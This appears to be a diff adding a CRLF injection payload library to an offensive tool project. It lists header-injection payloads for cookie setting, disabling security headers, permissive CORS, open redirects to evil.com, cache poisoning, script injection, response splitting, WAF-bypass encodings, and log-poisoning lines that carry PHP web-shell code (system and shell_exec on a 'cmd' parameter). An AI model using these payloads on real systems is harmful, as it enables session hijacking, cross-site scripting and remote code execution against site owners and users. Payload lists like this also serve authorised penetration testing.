@@ -1,0 +1,89 @@
+###############################################
+#  CRLF Injection Payload Library – v2.0
+#  Author: Gray (Subir) – CRLF Injector Project
+###############################################
+
+########## 1. BASIC COOKIE INJECTION ##########
+Set-Cookie: hacker=owned
+Set-Cookie: admin=true
+Set-Cookie: session=pwned
+Set-Cookie: role=superuser
+
+########## 2. SECURITY HEADER OVERRIDES ##########
+X-Frame-Options: ALLOWALL
+X-Content-Type-Options: insecure
+X-XSS-Protection: 0
+Referrer-Policy: unsafe-url
+Strict-Transport-Security: max-age=0
+Content-Security-Policy: unsafe-inline
+Permissions-Policy: interest-cohort=*
+
+########## 3. CORS MISCONFIG PAYLOADS ##########
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET,POST,OPTIONS
+Access-Control-Max-Age: 999999
+
+########## 4. REDIRECTION PAYLOADS ##########
+Location: https://evil.com
+Location: http://attacker.test
+Location: javascript:alert('XSS')
+Location: //evil.com
+
+########## 5. CACHE POISONING ##########
+Cache-Control: public,max-age=999999
+X-Cache: HIT
+Surrogate-Control: max-age=999999
+Age: 0
+Expires: Wed, 21 Oct 2050 07:28:00 GMT
+
+########## 6. HTML / BODY INJECTION ##########
+Content-Type: text/html
+
+<h1>Injected by CRLF Exploit</h1>
+
+<script>alert('Header Injection')</script>
+
+########## 7. LOG POISONING (RCE CHAINS) ##########
+User-Agent: <?php system($_GET['cmd']); ?>
+User-Agent: <?php echo shell_exec($_GET['cmd']); ?>
+User-Agent: <script>alert('XSS')</script>
+User-Agent: curl-pwned-by-Gray
+
+########## 8. RESPONSE SPLITTING ##########
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+<h2>Split Response Successful</h2>
+
+HTTP/1.1 302 Found
+Location: https://evil.com
+
+########## 9. WAF/IDS BYPASS PAYLOADS ##########
+Set-Cookie:%20bypass=1
+Set-Cookie:+tabbed=ok
+Set-Cookie:%09tab_char
+X-Test:%0AInjected
+Injected:%0D%0ASet-Cookie:WAF=Bypassed
+
+########## 10. MULTI‑HEADER CHAINS ##########
+Set-Cookie: session=owned
+Access-Control-Allow-Origin: *
+Cache-Control: public,max-age=9999
+
+Set-Cookie: admin=true
+X-Frame-Options: ALLOWALL
+X-XSS-Protection: 0
+
+########## 11. ADVANCED CHAINED EXPLOITS ##########
+Content-Type: text/html
+X-Frame-Options: ALLOWALL
+X-Content-Type-Options: insecure
+
+<h1>Advanced Chain Executed</h1>
+
+########## 12. DEBUG / SERVERTOKEN CORRUPTION ##########
+Server: Apache
+Server: Nginx
+Server: GrayInjector
+X-Powered-By: PHP/999.0
